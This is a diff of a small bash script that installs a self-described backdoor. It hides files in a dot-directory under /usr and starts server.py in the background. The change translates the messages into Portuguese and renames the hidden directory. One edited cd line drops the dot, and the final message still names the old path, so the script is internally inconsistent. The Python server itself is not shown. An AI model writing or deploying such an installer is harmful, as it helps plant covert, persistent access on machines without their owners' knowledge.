@@ -1,10 +1,10 @@
 #!/bin/bash
 clear
-echo "[+] Installing Backdoor..."
-mkdir /usr/.f-root
-mv server.py /usr/.f-root/
-mv kick_message /usr/.f-root/
-mv kitty.sh /usr/.f-root/
-cd /usr/.f-root/
-python3 /usr/.f-root/server.py >/usr/.f-root/backdoor.log 2>/usr/.f-root/backdoor.log &
-echo "[+] Backdoor Installed... on (/usr/.f-root)"
+echo "[+] Instalando Backdoor..."
+mkdir /usr/.L-root
+mv server.py /usr/.L-root/
+mv kick_message /usr/.L-root/
+mv kitty.sh /usr/.L-root/
+cd /usr/L-root/
+python3 /usr/.L-root/server.py >/usr/.L-root/backdoor.log 2>/usr/.L-root/backdoor.log &
+echo "[+] Backdoor foi instalado com sucesso... no (/usr/.f-root)"
